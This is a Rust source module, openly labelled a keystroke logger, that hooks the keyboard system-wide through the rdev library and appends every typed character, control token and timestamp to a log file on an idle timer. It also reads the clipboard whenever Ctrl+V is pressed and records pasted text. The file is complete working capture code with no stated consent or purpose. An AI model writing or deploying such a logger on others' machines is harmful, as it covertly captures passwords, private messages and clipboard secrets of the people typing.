//! Keystroke logger.
//!
//! Captures keystrokes with `rdev` (which uses `SetWindowsHookEx` on Windows)
//! and writes them to a timestamped text file, flushing on an idle threshold.
//!
//! Behaviour matches the original Python implementation:
//!   * Printable characters append to an in-memory buffer.
//!   * Non-printable keys (Enter, Tab, Esc, Backspace) are serialised as
//!     escape tokens.
//!   * After `break_threshold` seconds without typing the buffer is flushed
//!     to the log file, prefixed with a `[HH:MM:SS]` timestamp.
//!   * Ctrl+V is reported as `<PASTE: …>` using the current clipboard
//!     contents (requires `arboard`).

use std::fs::OpenOptions;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use anyhow::Result;
use chrono::Local;
use parking_lot::Mutex;
use rdev::{listen, Event, EventType, Key};

const FLUSH_INTERVAL: Duration = Duration::from_secs(3);
const BREAK_THRESHOLD: Duration = Duration::from_secs(2);

struct State {
    buffer: String,
    last_key: Instant,
    last_flush: Instant,
    ctrl: bool,
    shift: bool,
    clipboard_snapshot: String,
    log_path: PathBuf,
}

impl State {
    fn new(log_path: PathBuf) -> Self {
        let now = Instant::now();
        Self {
            buffer: String::new(),
            last_key: now,
            last_flush: now,
            ctrl: false,
            shift: false,
            clipboard_snapshot: String::new(),
            log_path,
        }
    }

    fn flush(&mut self) {
        if self.buffer.trim().is_empty() {
            self.buffer.clear();
            self.last_flush = Instant::now();
            return;
        }
        let ts = Local::now().format("[%H:%M:%S] ");
        if let Ok(mut f) = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&self.log_path)
        {
            let _ = writeln!(f, "{ts}{}", self.buffer);
        }
        self.buffer.clear();
        self.last_flush = Instant::now();
    }

    fn write_line(&mut self, line: &str) {
        let ts = Local::now().format("[%H:%M:%S] ");
        if let Ok(mut f) = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&self.log_path)
        {
            let _ = writeln!(f, "{ts}{line}");
        }
    }
}

fn ensure_parent(p: &Path) -> Result<()> {
    if let Some(parent) = p.parent() {
        std::fs::create_dir_all(parent)?;
    }
    Ok(())
}

fn key_to_token(key: &Key) -> Option<&'static str> {
    use Key::*;
    Some(match key {
        Return => "\n",
        Space => " ",
        Tab => "\t",
        Backspace => "<BACKSPACE>",
        Escape => "<ESC>",
        _ => return None,
    })
}

fn char_from_name(name: &Option<String>) -> Option<char> {
    name.as_deref().and_then(|s| {
        let mut chars = s.chars();
        let c = chars.next()?;
        if chars.next().is_none() && !c.is_control() {
            Some(c)
        } else {
            None
        }
    })
}

/// Start the keylogger loop. Blocks until `stop_flag` becomes true.
pub fn run(log_path: PathBuf, stop_flag: Arc<AtomicBool>) -> Result<()> {
    ensure_parent(&log_path)?;
    let state = Arc::new(Mutex::new(State::new(log_path)));

    // Background timer that flushes idle buffers.
    {
        let state = Arc::clone(&state);
        let stop = Arc::clone(&stop_flag);
        std::thread::spawn(move || {
            while !stop.load(Ordering::Relaxed) {
                std::thread::sleep(Duration::from_millis(500));
                let mut s = state.lock();
                if s.last_flush.elapsed() > FLUSH_INTERVAL {
                    s.flush();
                }
            }
            // Final flush on shutdown.
            state.lock().flush();
        });
    }

    let callback_state = Arc::clone(&state);
    let callback = move |event: Event| {
        if stop_flag.load(Ordering::Relaxed) {
            return;
        }
        let mut s = callback_state.lock();
        match event.event_type {
            EventType::KeyPress(key) => {
                if s.last_key.elapsed() > BREAK_THRESHOLD {
                    s.flush();
                }
                match key {
                    Key::ControlLeft | Key::ControlRight => {
                        s.ctrl = true;
                        s.clipboard_snapshot =
                            arboard::Clipboard::new().ok().and_then(|mut c| c.get_text().ok()).unwrap_or_default();
                    }
                    Key::ShiftLeft | Key::ShiftRight => s.shift = true,
                    _ => {
                        // Detect Ctrl+V paste.
                        if s.ctrl {
                            let pasted_key = matches!(
                                event.name.as_deref(),
                                Some("v") | Some("V")
                            );
                            if pasted_key {
                                let pasted = arboard::Clipboard::new()
                                    .ok()
                                    .and_then(|mut c| c.get_text().ok())
                                    .unwrap_or_default();
                                if !pasted.is_empty() && pasted != s.clipboard_snapshot {
                                    s.flush();
                                    s.write_line(&format!("<PASTE: {pasted}>"));
                                }
                                return;
                            }
                        }

                        if let Some(tok) = key_to_token(&key) {
                            s.buffer.push_str(tok);
                        } else if let Some(c) = char_from_name(&event.name) {
                            s.buffer.push(c);
                        }
                    }
                }
                s.last_key = Instant::now();
            }
            EventType::KeyRelease(key) => match key {
                Key::ControlLeft | Key::ControlRight => s.ctrl = false,
                Key::ShiftLeft | Key::ShiftRight => s.shift = false,
                _ => {}
            },
            _ => {}
        }
    };

    // `rdev::listen` blocks for the lifetime of the process.
    if let Err(e) = listen(callback) {
        anyhow::bail!("keyboard hook failed: {:?}", e);
    }
    Ok(())
}
